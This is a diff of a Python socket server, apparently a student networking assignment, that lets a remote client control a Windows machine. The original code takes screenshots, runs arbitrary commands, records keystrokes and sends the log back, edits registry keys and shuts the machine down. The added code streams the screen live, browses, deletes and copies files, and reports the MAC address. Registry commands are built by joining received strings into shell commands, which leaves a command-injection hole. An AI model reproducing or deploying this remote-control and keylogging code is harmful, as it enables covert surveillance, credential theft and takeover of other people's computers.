@@ -1,15 +1,20 @@
 import sys
+from shutil import copy2,copytree
 import socket
 import threading
 import time
 from PIL import Image
 import numpy as np
+from FileManager import view_folder
 from ScreenShot import*
 from RunningProccess import*
 from KeyLogger import*
 from ShutDown import*
 from Registry import*
 from tkinter import*
+from streaming import*
+from uuid import getnode as get_mac
+
 HEADER = 64
 PORT = 5050
 SERVER = socket.gethostbyname(socket.gethostname())
@@ -38,7 +43,13 @@ GET_KEY_VALUE = "GET KEY VALUE"
 ADD_NEW_KEY = "ADD NEW KEY"
 DELETE_KEY = "DELETE KEY"
 SET_KEY_VALUE ="SET KEY VALUE"
-
+LIVE_SCREEN = "LIVE SCREEN"
+STOP_LIVE = "STOP LIVE"
+VIEW_FOLDER = "VIEW FOLDER"
+DELETE_FILE = "DELETE FILE"
+COPY_DIR = "COPY DIR"
+SHOW_MAC_ADDR = "SHOW MAC ADDR"
+LOG_OUT = "LOG OUT"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
@@ -88,166 +99,230 @@ def send_file1(conn,filename):
 
 def handle_client(conn, addr):    
     connected = True
+    
     while connected:
-        msg_length = conn.recv(HEADER).decode(FORMAT)
-        if msg_length:
-            msg_length = int(msg_length)
-            msg = conn.recv(msg_length).decode(FORMAT)
-            print(f"[{addr}] {msg}") 
-            
+        try:
+            msg_length = conn.recv(HEADER).decode(FORMAT)
+            if msg_length:
+                msg_length = int(msg_length)
+                msg = conn.recv(msg_length).decode(FORMAT)
+                print(f"[{addr}] {msg}") 
+                
 
 
-            if msg == TAKE_SCREEN_SHOT:
-                Take_Screenshot("ScreenShot.png")
-                send_file1(conn,"ScreenShot.png")
-                    
+                if msg == TAKE_SCREEN_SHOT:
+                    Take_Screenshot("ScreenShot.png")
+                    send_file1(conn,"ScreenShot.png")
+                        
 
 
 
-            elif msg == RUNNING_PROCESS:
-                def execute():
+                elif msg == RUNNING_PROCESS:
                     list_proc = enum_running_process()
                     size = len(list_proc)
                     size = str(size)
                     if size =='0':
-                        send1(conn,'No running app!')
+                        send1(conn,'No running process!')
                     else:
                         send1(conn,size)
                         for app in list_proc:
                             send1(conn,app[0])
                             send1(conn,app[1])
                             send1(conn,app[2])
-                sidequest_thread = threading.Thread(target= execute)
-                sidequest_thread.start()
-                
-
-
-
-
-            elif msg == KILL_PROCESS_VIA_PID:
-                def execute():
-                    pid = recv1(conn)
-                    pid = int(pid)
-                    process_killed = kill_process_by_id(pid)
-                    send1(conn,str(process_killed))
-                sidequest_thread = threading.Thread(target= execute)
-                sidequest_thread.start()
-                
-            
-
-        
-                
-            
-            elif msg == START_PROCESS:
-                proc = recv1(conn)
-                def execute():
-                    os.system(proc)
-                sidequest_thread = threading.Thread(target= execute)
-                sidequest_thread.start()
-
-                
-            elif msg == KEYLOGGING:
-                def init_listener():
-                    with Listener(on_press = getKey) as listener:
-                        listener.join()
-                sidequest_thread = threading.Thread(target= init_listener)
-                sidequest_thread.start()
-            
-            elif msg == STOP_KEYLOGGING:
-                for i in range(10):
-                    Key_press(Key.f12)
-                
-            
-            elif msg == PRINT_KEYLOG:
-                try:
                     
-                    with open("KeyLog.txt","r") as file:
-                        key_log_string=file.read()
-                        
-                    send1(conn,key_log_string)
-                    #Delete previous log
-                    os.remove('KeyLog.txt')
-                except FileNotFoundError:
-                    send1(conn,"File not found")
 
 
-            elif msg == SHUTDOWN:
-                sec = 40
-                send1(conn,f"Server shutdown in {sec} seconds")
-                shutdown(sec)
 
-            
+
+                elif msg == KILL_PROCESS_VIA_PID:
+                    def execute():
+                        pid = recv1(conn)
+                        pid = int(pid)
+                        process_killed = kill_process_by_id(pid)
+                        send1(conn,str(process_killed))
+                    sidequest_thread = threading.Thread(target= execute)
+                    sidequest_thread.start()
+                    
                 
 
-
-            elif msg == SEND_REG_FILE:
-                content = recv1(conn)
-                filename = "C:\Client_Reg.reg"
-                with open(filename,'w') as reg_file:
-                    reg_file.write(content)
-                os.system("regedit /s " + filename)
-                
-
-            elif msg == GET_KEY_VALUE:
-                path = recv1(conn)
-                value = recv1(conn)
-                ans = get_registry_value(path,value)
-                send1(conn,ans)
-
-            elif msg == DELETE_KEY_VALUE:
-                path = recv1(conn)
-                print(path)
-                value = recv1(conn)
-                print(value)
-                ans = os.system("reg delete "+path+" /v "+ value + " /f")
-                send1(conn,str(ans))
-
-            elif msg == ADD_NEW_KEY:
-                path = recv1(conn)
-                ans = os.system('reg add '+ path)
-                send1(conn,str(ans))
-
-            elif msg == DELETE_KEY:
-                path = recv1(conn)
-                ans = os.system('reg delete '+ path + ' /f')
-                send1(conn,str(ans))
-
             
-            elif msg == SET_KEY_VALUE:
-                path = recv1(conn)
-                value = recv1(conn)
-                data = recv1(conn)
-                data_type = recv1(conn)
-                ans = os.system('reg add '+ path +' /v '+ value+ ' /t '+ data_type+ ' /d '+data+ ' /f')
-                send1(conn,str(ans))
+                    
+                
+                elif msg == START_PROCESS:
+                    proc = recv1(conn)
+                    def execute():
+                        os.system(proc)
+                    sidequest_thread = threading.Thread(target= execute)
+                    sidequest_thread.start()
+
+                    
+                elif msg == KEYLOGGING:
+                    def init_listener():
+                        with Listener(on_press = getKey) as listener:
+                            listener.join()
+                    sidequest_thread = threading.Thread(target= init_listener)
+                    sidequest_thread.start()
+                
+                elif msg == STOP_KEYLOGGING:
+                    for i in range(10):
+                        Key_press(Key.f12)
+                    
+                
+                elif msg == PRINT_KEYLOG:
+                    try:
+                        with open("KeyLog.txt","r") as file:
+                            key_log_string=file.read()
+                            
+                        send1(conn,key_log_string)
+                        #Delete previous log
+                        os.remove('KeyLog.txt')
+                    except FileNotFoundError:
+                        send1(conn,"File not found")
 
 
-            elif msg == RUNNING_APP:
-                def execute():
+                elif msg == SHUTDOWN:
+                    sec = 40
+                    send1(conn,f"Server shutdown in {sec} seconds")
+                    shutdown(sec)
+
+                
+                    
+
+
+                elif msg == SEND_REG_FILE:
+                    content = recv1(conn)
+                    filename = "C:\Client_Reg.reg"
+                    with open(filename,'w') as reg_file:
+                        reg_file.write(content)
+                    os.system("regedit /s " + filename)
+                    
+
+                elif msg == GET_KEY_VALUE:
+                    path = recv1(conn)
+                    value = recv1(conn)
+                    ans = get_registry_value(path,value)
+                    send1(conn,ans)
+
+                elif msg == DELETE_KEY_VALUE:
+                    path = recv1(conn)
+                    print(path)
+                    value = recv1(conn)
+                    print(value)
+                    ans = os.system("reg delete "+path+" /v "+ value + " /f")
+                    send1(conn,str(ans))
+
+                elif msg == ADD_NEW_KEY:
+                    path = recv1(conn)
+                    ans = os.system('reg add '+ path)
+                    send1(conn,str(ans))
+
+                elif msg == DELETE_KEY:
+                    path = recv1(conn)
+                    ans = os.system('reg delete '+ path + ' /f')
+                    send1(conn,str(ans))
+
+                
+                elif msg == SET_KEY_VALUE:
+                    path = recv1(conn)
+                    value = recv1(conn)
+                    data = recv1(conn)
+                    data_type = recv1(conn)
+                    ans = os.system('reg add '+ path +' /v '+ value+ ' /t '+ data_type+ ' /d '+data+ ' /f')
+                    send1(conn,str(ans))
+
+
+                elif msg == RUNNING_APP:
                     list_app = enum_running_app()
+                    print(list_app)
                     size = len(list_app)
                     if size > 0:
-                        size = str(size)
-                        send1(conn,size)
+                        send1(conn,str(size))
                         for app in list_app:
                             send1(conn,app[0])
+                            
                             send1(conn,app[1])
                             send1(conn,app[2])
                         
                     else:
                         send1(conn,"No running app!")
-                sidequest_thread = threading.Thread(target= execute)
-                sidequest_thread.start()
+                    
                 
-            
+                elif msg == LIVE_SCREEN:
 
+                    c = conn.recv(1).decode(FORMAT)
+                    
+                    while(c=="Y"):
+                        img = pyautogui.screenshot()
+                        frame = np.array(img)
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                        frame = imutils.resize(frame,width=600)
+                        a = pickle.dumps(frame)
+                        message = struct.pack("Q",len(a))+a 
+                        conn.sendall(message)
+                        
+                        #cv2.imshow('TRANSMITTING VIDEO',frame)
+                             
+                        
+                        # key = cv2.waitKey(1) & 0xFF
+                        c = conn.recv(1).decode(FORMAT)
+                        if c == 'N':
+                            break
 
-            elif msg == DISCONNECT_MESSAGE:
-                connected = False
-            
-            else: pass
-            time.sleep(0.500)
-            
+                   
+                elif msg == VIEW_FOLDER:
+                    path = recv1(conn)
+                    list_dir = view_folder(path)
+                    list_len = len(list_dir)
+                    
+                    send1(conn,str(list_len))
+
+                    for i in range(list_len):
+                        send1(conn,list_dir[i][0])
+                        send1(conn,str(int(list_dir[i][1])))
+                elif msg == DELETE_FILE:
+                    path = recv1(conn)
+                    if (path[len(path)-1]=='/'):
+                            path = path[:(len(path)-2)]
+                    try:
+                        os.remove(path)
+                        send1(conn,"DONE")
+                    except Exception:
+                        send1(conn,"FAIL")
+                    
+
+                elif msg == COPY_DIR:
+                    dir = recv1(conn)
+                    try:
+                        if dir[len(dir)-1]=='/':
+                            dir = dir[:(len(dir)-2)]
+                            copy_dir = dir  +"(copy)"
+                            copytree(dir,copy_dir)
+                        else:
+                            copy_dir = dir  +"(copy)"
+                            copy2(dir,copy_dir)
+                        send1(conn,"DONE")
+                    except Exception:
+                        send1(conn,"FAIL")
+
+                elif msg == SHOW_MAC_ADDR:
+                    mac = get_mac()
+                    mac = str(mac)
+                    send1(conn,mac)
+                    print(mac)
+                elif msg == LOG_OUT:
+                    log_out()
+
+                elif msg == DISCONNECT_MESSAGE:
+                    connected = False
+                
+                else:
+                     pass
+                time.sleep(0.500)
+        except Exception as e:
+            print("Gap loi o day")
+            print(msg+"===>"+e)
+            connected=False
+            pass    
     conn.close()
 
 
@@ -275,3 +350,4 @@ Server_windows.mainloop()
     
 
 
+# c:/Users/MSI-NK/OneDrive/Máy tính/socketAssignment-main/socketAssignment-main/
